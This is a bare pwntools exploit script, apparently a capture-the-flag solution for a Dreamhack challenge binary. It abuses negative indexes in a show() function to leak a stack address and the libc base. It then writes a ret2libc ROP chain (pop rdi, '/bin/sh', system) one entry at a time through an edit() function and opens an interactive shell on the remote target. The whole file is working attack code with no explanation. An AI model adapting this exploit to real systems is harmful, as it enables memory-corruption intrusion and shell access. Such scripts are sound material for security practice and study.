#!/usr/bin/python3 
from pwn import * 

exe = ELF('./chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		brva 0x000000000000140D
		brva 0x00000000000014BA
		brva 0x0000000000001471
		c
		''')

HOST = 'host8.dreamhack.games'
PORT = 21355

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def show(idx):
	sla(b'>> ', b'1')
	slan(b'number: ', idx)
def edit(idx, data):
	sla(b'>> ', b'2')
	slan(b'number: ', idx)
	sl(data)
#GDB()
input()
show(-7)
saved_rip = leak(r(6), -0x8)
info("stack: ", saved_rip)
show(-61)
libc.address = leak(r(6), 0x203ac0)
info("libc base: ", libc.address)

pop_rdi = libc.address + 0x10f75b
pld = flat(
	pop_rdi,
	saved_rip,
	)
edit(12, pld)

saved_rip += 0x8
pld = flat(
	next(libc.search(b'/bin/sh')),
	saved_rip,
	)
edit(12, pld)

saved_rip += 0x8
pld = flat(
	pop_rdi + 1,
	saved_rip,
	)
edit(12, pld)

saved_rip += 0x8
pld = flat(
	libc.sym.system,
	saved_rip,
	)
edit(12, pld)

sla(b'>> ', b'3')
p.interactive()